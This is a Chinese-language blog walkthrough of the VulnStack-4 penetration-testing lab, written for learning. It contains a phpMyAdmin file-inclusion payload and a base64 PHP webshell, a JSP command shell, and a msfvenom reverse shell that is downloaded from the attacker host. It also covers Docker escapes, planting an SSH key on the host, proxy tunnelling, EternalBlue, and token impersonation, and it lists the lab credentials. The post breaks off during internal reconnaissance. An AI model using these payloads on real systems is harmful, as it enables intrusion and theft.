<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/CTFHub-SSRF%E5%AD%A6%E4%B9%A0/image-20210708160940884.png" alt loading="lazy"></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://www.freebuf.com/articles/web/258365.html">我在CTFHub学习SSRF</a></li>
<li><a href="https://wh0ale.github.io/2019/01/22/2019-1-20-SSRF%E8%AF%A6%E8%A7%A3/">ssrf详解</a></li>
<li><a href="https://bbs.ichunqiu.com/thread-58455-1-1.html">SSRF系列之攻击FastCGI</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></li>
<li><a href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用</a></li>
<li><a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html">利用redis写webshell</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF题</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>VulnStack-4靶场练习</title>
    <url>/posts/b57d0eac/</url>
    <content><![CDATA[<p>本文全程参考 <a href="https://www.freebuf.com/articles/network/244704.html">记一次Vulnstack靶场内网渗透（二）</a> 来复现渗透过程，目的在于学习渗透流程和基本思路，记录下学习笔记</p>
<span id="more"></span>

<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>靶机地址：<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/6/">http://vulnstack.qiyuanxuetang.net/vuln/detail/6/</a></p>
<p>学习思路：st漏洞利用、phpmyadmin getshell、tomcat 漏洞利用、docker逃逸、ms14-068、ssh密钥利用、流量转发、历史命令信息泄露、域渗透</p>
<p>攻击机Kali (192.168.0.106)</p>
<p>虚拟网卡配置</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630130756345.png" alt loading="lazy"></p>
<p>Ubuntu web服务器网卡配置，配两张网卡（192.168.0.105，192.168.183.128）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131230765.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131200044.png" alt loading="lazy"></p>
<p>DC Windows Server 2008 R2服务器网卡配置（192.168.183.130）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131335941.png" alt loading="lazy"></p>
<p>Windows 7网卡配置（192.168.183.129）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630131525870.png" alt loading="lazy"></p>
<p>然后把docker容器都开起来，靶机里有vulhub，直接拉就行了，这里拉三个</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /home/ubuntu/Desktop/vulhub/struts/s2-045
<span class="token function">docker-compose</span> up -d
<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/tomcat/CVE-2017-12615
<span class="token function">docker-compose</span> up -d
<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/<span class="token punctuation">..</span>/phpmyadmin/CVE-2018-12613
<span class="token function">docker-compose</span> up -d</code></pre>

<p>分别对应</p>
<ul>
<li><strong>s2-045</strong></li>
<li><strong>CVE-2017-12615(tomcat put上传)</strong></li>
<li><strong>CVE-2018-12613(phpmyadmin文件包含漏洞)</strong></li>
</ul>
<p>docker开启情况如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210707093959463.png" alt loading="lazy"></p>
<p>初始密码</p>
<ul>
<li>f服务器：ubuntu-&gt;ubuntu</li>
<li>域成员Win7：douser-&gt;Dotest123</li>
<li>域控DC：administrator-&gt;Test2008</li>
</ul>
<p>靶机环境拓扑（ip地址在文中可能变化）</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210707093500532.png" alt loading="lazy"></p>
<p><strong>目标：</strong></p>
<p>域控中存在一份重要文件——《漂亮国网络攻击授权报告》。</p>
<h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p>nmap信息搜集</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">nmap -T4 -A -sN <span class="token number">192.168</span>.0.105</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704205813557.png" alt loading="lazy"></p>
<p>有<code>ssh</code>，<code>struts2</code>，<code>tomcat</code>，<code>phpmyadmin</code>等服务</p>
<h3 id="Web渗透"><a href="#Web渗透" class="headerlink" title="Web渗透"></a>Web渗透</h3><h4 id="struts2渗透"><a href="#struts2渗透" class="headerlink" title="struts2渗透"></a>struts2渗透</h4><p>直接上工具扫一下，工具地址：<a href="https://github.com/zhzyker/vulmap">https://github.com/zhzyker/vulmap</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210707124315972.png" alt loading="lazy"></p>
<p>存在s2-045，RCE</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210707124347853.png" alt loading="lazy"></p>
<h4 id="phpmyadmin渗透"><a href="#phpmyadmin渗透" class="headerlink" title="phpmyadmin渗透"></a>phpmyadmin渗透</h4><p>看到<code>phpmyadmin</code>版本为4.8.1，想到文件包含漏洞（CVE-2018-12613）</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">searchsploit phpmyadmin <span class="token number">4.8</span>.1</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630142047587.png" alt loading="lazy"></p>
<p>测试payload：</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//192.168.0.105:2003/index.php?target=db_sql.php%253f/../../../../../etc/passwd</span></span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704205952878.png" alt loading="lazy"></p>
<p>利用<code>session</code>文件包含，查询一条<code>sql</code>语句，<code>file_put_contents</code>写文件</p>
<pre class="language-mysql" data-language="mysql"><code class="language-mysql">SELECT &#39;&lt;?php file_put_contents(&quot;extrader.php&quot;,base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbMV0pPz4&#x3D;&quot;));?&gt;</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704210700760.png" alt loading="lazy"></p>
<p><code>cookie</code>中<code>phpMyAdmin</code>的值为<code>d70bbb50bbcc99dde55870cf69eda13b</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704210737586.png" alt loading="lazy"></p>
<p>访问<code>http://192.168.0.105:2003/index.php?target=db_sql.php%3f../../../../../../../tmp/sess_d70bbb50bbcc99dde55870cf69eda13b</code>，把shell写进去</p>
<p>随后蚁剑连接</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211035539.png" alt loading="lazy"></p>
<p>成功连接</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211100989.png" alt loading="lazy"></p>
<h4 id="tomcat渗透"><a href="#tomcat渗透" class="headerlink" title="tomcat渗透"></a>tomcat渗透</h4><pre class="language-bash" data-language="bash"><code class="language-bash">searchsploit tomcat <span class="token number">8.5</span>.19</code></pre>

<p>由nmap扫描信息可知，2002端口的Tomcat版本为8.5.19，search一下发现有洞</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630142226990.png" alt loading="lazy"></p>
<p>用第一个脚本进行exploit</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630142742574.png" alt loading="lazy"></p>
<p>成功拿到root权限</p>
<p>利用漏洞原理传个shell，好执行命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630144121828.png" alt loading="lazy"></p>
<pre class="language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;java.util.*,java.io.*,java.net.*&quot;%&gt;
&lt;%
%&gt;
&lt;HTML&gt;&lt;BODY&gt;
&lt;FORM METHOD&#x3D;&quot;POST&quot; NAME&#x3D;&quot;myform&quot; ACTION&#x3D;&quot;&quot;&gt;
&lt;INPUT TYPE&#x3D;&quot;text&quot; NAME&#x3D;&quot;cmd&quot;&gt;
&lt;INPUT TYPE&#x3D;&quot;submit&quot; VALUE&#x3D;&quot;Send&quot;&gt;
&lt;&#x2F;FORM&gt;
&lt;pre&gt;
&lt;%
if (request.getParameter(&quot;cmd&quot;) !&#x3D; null) &#123;
    out.println(&quot;Command: &quot; + request.getParameter(&quot;cmd&quot;) + &quot;\n&lt;BR&quot;);
    Process p &#x3D; Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;));
    OutputStream os &#x3D; p.getOutputStream();
    InputStream in &#x3D; p.getInputStream();
    DataInputStream dis &#x3D; new DataInputStream(in);
    String disr &#x3D; dis.readLine();
    while ( disr !&#x3D; null ) &#123;
        out.println(disr); disr &#x3D; dis.readLine(); 
    &#125;
&#125;
%&gt;
&lt;&#x2F;pre&gt;
&lt;&#x2F;BODY&gt;&lt;&#x2F;HTML&gt;</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630144244721.png" alt loading="lazy"></p>
<h3 id="Docker主机逃逸"><a href="#Docker主机逃逸" class="headerlink" title="Docker主机逃逸"></a>Docker主机逃逸</h3><p><strong>msf弹shell</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msfvenom -p linux/x86/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.0.106 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f elf <span class="token operator">></span> shell.elf</code></pre>

<p>生成一个<code>msf</code>马<code>shell.elf</code></p>
<p>在本地用python开一个http服务</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">python3 -m http.server</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211900711.png" alt loading="lazy"></p>
<p>下载shell并给权限</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.0.106:8000/shell.elf
<span class="token function">chmod</span> <span class="token number">777</span> shell.elf</code></pre>

<p>kali机开启监听</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">msfconsole
use exploit/multi/handler
<span class="token builtin class-name">set</span> PAYLOAD linux/x86/meterpreter/reverse_tcp
<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.183.1
show options
run</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704211955352.png" alt loading="lazy"></p>
<p>随后靶机上执行<code>./shell.elf</code>，msf即可成功获得会话</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704212038957.png" alt loading="lazy"></p>
<h4 id="利用CVE-2019-5736逃逸"><a href="#利用CVE-2019-5736逃逸" class="headerlink" title="利用CVE-2019-5736逃逸"></a><strong>利用CVE-2019-5736逃逸</strong></h4><p>在Docker 18.09.2之前的版本中使用的runc版本小于1.0-rc6，因此允许攻击者重写宿主机上的runc 二进制文件，攻击者可以在宿主机上以root身份执行命令。</p>
<p>平台或产品 受影响版本 Docker Version &lt; 18.09.2 runC Version &lt;= 1.0-rc6</p>
<p>恶意容器需满足以下两个条件之一：</p>
<ul>
<li>由一个攻击者控制的恶意镜像创建</li>
<li>攻击者具有某已存在容器的写权限，且可通过docker exec进入。</li>
</ul>
<p>Poc地址：<a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
<p>是一个go写的脚本，需要自己下载编译</p>
<p>先装go环境</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> /usr/local
<span class="token function">wget</span> https://studygolang.com/dl/golang/go1.16.5.linux-amd64.tar.gz
<span class="token function">tar</span> -xzf go1.16.5.linux-amd64.tar.gz
<span class="token function">vim</span> /etc/profile
添加 <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/local/go/bin
<span class="token builtin class-name">source</span> /etc/profile
go version</code></pre>

<p>出现版本号即安装成功</p>
<p>编译生成payload</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">CGO_ENABLED</span><span class="token operator">=</span><span class="token number">0</span> <span class="token assign-left variable">GOOS</span><span class="token operator">=</span>linux <span class="token assign-left variable">GOARCH</span><span class="token operator">=</span>amd64 go build main.go</code></pre>

<p>用msf会话将编译得到的main文件上传到docker容器的/home目录中，并赋权</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">upload /home/kali/CVE-2019-5736-PoC/main /home</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630153924481.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154042270.png" alt loading="lazy"></p>
<p>在kali机上监听</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -lvp <span class="token number">4444</span></code></pre>

<p>到靶机上执行<code>./main</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154346666.png" alt loading="lazy"></p>
<p>此时，只需等待目标机管理员重启该docker容器，payload就会触发，如下图，我们手动模拟docker重启：</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> <span class="token builtin class-name">exec</span> -it 09dd4e5bfa91 /bin/bash</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154713907.png" alt loading="lazy"></p>
<p>显示payload执行成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630154743000.png" alt loading="lazy"></p>
<p>但是并未收到shell</p>
<h4 id="利用-privileged特权模式逃逸"><a href="#利用-privileged特权模式逃逸" class="headerlink" title="利用--privileged特权模式逃逸"></a><strong>利用--privileged特权模式逃逸</strong></h4><ul>
<li>特权模式于版本0.6时被引入Docker，允许容器内的root拥有外部物理机root权限，而此前容器内root用户仅拥有外部物理机普通用户权限。</li>
<li>使用特权模式启动容器，可以获取大量设备文件访问权限。因为当管理员执行<code>docker run —privileged</code>时，Docker容器将被允许访问主机上的所有设备，并可以执行mount命令进行挂载。</li>
<li>当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。</li>
</ul>
<p>具体可参考：<a href="https://www.kingkk.com/2021/01/%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4%E7%9A%84%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">配置不当导致的容器逃逸</a></p>
<p>学习路线中有一个ssh密钥利用，推测是利用docker的特权模式来在宿主机硬盘中写入ssh私钥，实现ssh免密登录宿主机，从而实现对目标宿主机的控制</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> /hack
<span class="token function">ls</span> /dev

<span class="token punctuation">..</span>.
sda
sda1
sda2
sda5
<span class="token punctuation">..</span>.</code></pre>

<p>尝试将<code>/dev/sda1</code>挂载到<code>/hack</code>目录里<code>mount /dev/sda1 /hack</code>，<code>ls /hack</code>查看，挂载成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630155318769.png" alt loading="lazy"></p>
<p><strong>在docker容器里挂载一个宿主的本地目录，这样某些容器里输出的文件，就可以在本地目录中打开访问了。</strong></p>
<p>将sda1挂载成功，我们就可以通过访问容器内部的/hack路径来达到访问整个宿主机的目的，比如我们访问<code>/hack/home</code>目录也就是访问宿主机的<code>/home</code>目录</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210630160348268.png" alt loading="lazy"></p>
<p>本地生成ssh秘钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">ssh-keygen -f hack
<span class="token function">chmod</span> <span class="token number">600</span> hack    // 不要忘记对秘钥文件赋600权限，否则不能执行</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704212159965.png" alt loading="lazy"></p>
<p>我们要将<code>ssh</code>秘钥写入到<code>.ssh</code>目录里面并将文件命名为<code>authorized_keys</code>（目标机<code>.ssh</code>目录权限必须为700）。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> -avx /hack/home/ubuntu/.ssh/id_rsa.pub /hack/home/ubuntu/.ssh/authorized_keys    <span class="token comment"># -avx是将权限也一起复制</span>

<span class="token builtin class-name">echo</span> <span class="token string">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCg9LpD/MuFWzIzUQB4RQCFa8Avljlla4Z0iuk3jMQVxrxcDjOhoaLmXmbS63/crPQ15s1oEzNpi2L0MtU/ZMbDFHpKVJGSwNbZeMzEnYsOMd1x4r6BojP4bN4d2okv4sYVSCgWiNUQBHWQcUcnf3rkFw309maxSIwiNNl1C6jzwCNjo3rWA9YV8869N7q/oZtPob3M5yVT77nYMOdO4mnU/A8dbr8KkmcjoVZclK1aAnu96XJywWmArtfZjF9FdlqUkB9ZhknnpxHqP1/sH5lNk/S/pOQTq94VpU4YdK4aBt5mFj16okbudhNKGOBBlNFECcQIU/11djNDYD+FqVn7H/rKuYa7LOJkNhgXv/Q7tBIuoJBrWKqFSQPxUdiTDzeuWhWVw5Kjzf3sEoTOHqO7oUD23iQHnoO1ZwxJp/CnDRSTyCcxTcUwheM+JTSEXembyDtQWPmt3g24UNish8s3INTPT2Abd1q2mspwuSKWHuZo8yIrNq5mfS8lvkhT1rc= kali@kali'</span> <span class="token operator">></span> /hack/home/ubuntu/.ssh/authorized_keys    <span class="token comment"># 将ssh秘钥写入authorized_keys文件</span></code></pre>

<p>如果上面echo不进去可以直接在msf中上传</p>
<p>此时，攻击者就可以利用自己的私钥进行免密登陆目标宿主机了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> -i hack ubuntu@192.168.0.105  <span class="token punctuation">(</span>图后面加的,IP地址变了<span class="token punctuation">)</span></code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210706112334391.png" alt loading="lazy"></p>
<h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><h4 id="内网探测添加路由"><a href="#内网探测添加路由" class="headerlink" title="内网探测添加路由"></a>内网探测添加路由</h4><p>我们已经拿到ubuntu这台服务器，重新弹个meterpreter过来</p>
<p>kali机重新开启一个Web服务：<code>python3 -m http.server</code></p>
<p>msf上监听端口</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">set</span> AutoRunScript migrate -f  <span class="token punctuation">(</span>自动迁移进程,防止用户删除木马,丢失目标<span class="token punctuation">)</span></code></pre>

<p>在ubuntu上执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> http://192.168.0.106:8000/shell.elf
<span class="token function">chmod</span> <span class="token number">777</span> shell.elf
./shell.elf</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210702142225406.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704213704739.png" alt loading="lazy"></p>
<p>msf传一个ew上去<code>upload /home/kali/ew_for_linux64 /home/ubuntu</code></p>
<p><code>ifconfig</code>查看Ubuntu上的内网</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704214545080.png" alt loading="lazy"></p>
<p>发现存在（192.168.183.1/24）这个内网</p>
<p>于是我们在ubuntu上开启socks5正向代理</p>
<p>ew下链接：<a href="https://github.com/idlefire/ew">https://github.com/idlefire/ew</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> ew_for_linux64
./ew_for_linux64 -s ssocksd -l <span class="token number">1080</span> </code></pre>

<p>此时，kali上的应用程序就可以通过proxychains代理进目标内网了<code>vim /etc/proxychains4.conf</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704214215866.png" alt loading="lazy"></p>
<p>探测内网存活的主机，因为使用的是socks的代理，只能使用tcp协议，所以nmap使用的时候要使用<code>-sT</code>选择使用<code>tcp</code>协议，要使用<code>-Pn</code>不使用<code>ICMP</code>的<code>ping</code>确认主机存活</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap -sT -sV -Pn -n -p22,445 <span class="token number">192.168</span>.183.0/24</code></pre>

<p>经过扫描可以得知目标内网中还有192.168.183.129（Win7）和192.168.183.130（DC）这两台主机。并且都开了445端口</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704222620931.png" alt loading="lazy"></p>
<p>在msf添加内网路由，这里直接在msf中<code>run autoroute</code>会报错</p>
<p>具体参考：<a href="https://www.jason-w.cn/pentest/2021/02/28/242.html">https://www.jason-w.cn/pentest/2021/02/28/242.html</a></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">background
use post/multi/manage/autoroute
show options
<span class="token builtin class-name">set</span> <span class="token environment constant">SESSION</span> <span class="token number">7</span>
<span class="token builtin class-name">set</span> SUBNET <span class="token number">192.168</span>.183.0
show options
exploit
route</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704221640149.png" alt loading="lazy"></p>
<p><code>exploit</code>后查看<code>route</code>路由</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704221735839.png" alt loading="lazy"></p>
<h4 id="ms17-010利用"><a href="#ms17-010利用" class="headerlink" title="ms17_010利用"></a>ms17_010利用</h4><p>扫描目标内网中可能存在ms17_010永恒之蓝漏洞的主机</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/smb/smb_ms17_010 
<span class="token builtin class-name">set</span> RHOSTS <span class="token number">192.168</span>.183.128-130
run</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210704223127961.png" alt loading="lazy"></p>
<p>先打Windows7这台</p>
<p>我们使用<code>chisel</code>代理工具来进行内网渗透连接，下载链接：<a href="https://github.com/jpillora/chisel">https://github.com/jpillora/chisel</a></p>
<p>具体使用方法可以看：<a href="https://www.anquanke.com/post/id/234771">https://www.anquanke.com/post/id/234771</a></p>
<p>为什么不用原来的ew，因为用ew不稳定，<code>ms17_011</code>打不通（本人亲测打不通）</p>
<p>Ubuntu上执行<code>./chisel server -p 2333 --socks5</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103219718.png" alt loading="lazy"></p>
<p>Kali机上进行连接<code>./chisel client 192.168.0.107:2333 1080:socks</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103303270.png" alt loading="lazy"></p>
<p>反向代理，这样我们kali机上的1080端口就可以访问内网里的主机了</p>
<p>然后用msf打</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">setg Proxies socks5:127.0.0.1:1080       // 设置代理，不设置代理ms17_010很难打通
use exploit/windows/smb/ms17_010_eternalblue
<span class="token builtin class-name">set</span> payload windows/x64/meterpreter/bind_tcp
<span class="token builtin class-name">set</span> RHOST <span class="token number">192.168</span>.183.129
<span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.0.106
<span class="token builtin class-name">set</span> LPORT <span class="token number">4444</span>
<span class="token builtin class-name">set</span> AutoRunScript post/windows/manage/migrate             // 自动迁移进程
run</code></pre>

<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103725565.png" alt loading="lazy"></p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/VulnStack-4%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0/image-20210705103739255.png" alt loading="lazy"></p>
<p>一次打通</p>
<h4 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h4><pre class="language-bash" data-language="bash"><code class="language-bash">sysinfo                <span class="token comment">#查看主机信息</span>
getuid                 <span class="token comment">#查看当前token</span>
use incognito          <span class="token comment">#加载incognito，（用来盗窃目标主机的令牌或是假冒用户)</span>
list_tokens -u         <span class="token comment">#列出目标主机用户的可用令牌</span>
impersonate_token <span class="token string">"DEMO\douser"</span> <span class="token comment">#模拟DEMO\douser用户</span>
rev2self               <span class="token comment">#返回到之前的AccessToken权限</span></code></pre>

<pre class="language-bash" data-language="bash"><code class="language-bash">execute -f cmd.exe -i       <span class="token comment"># 交互式运行cmd</span>
execute -f cmd.exe -i -t    <span class="token comment"># 使用可用token 运行</span>
execute -f cmd.exe -i -H -t <span class="token comment"># 同上，同时隐藏进程</span>

<span class="token comment"># 可以直接shell</span>

chcp <span class="token number">65001</span>      <span class="token comment"># 简单解决一下乱码</span>
ipconfig /all   <span class="token comment"># 查看本机ip，所在域</span>
route print     <span class="token comment"># 打印路由信息</span>
net view        <span class="token comment"># 查看局域网内其他主机名</span>
arp -a          <span class="token comment"># 查看arp缓存</span>
<span class="token function">whoami</span>
net start       <span class="token comment"># 查看开启了哪些服务</span>
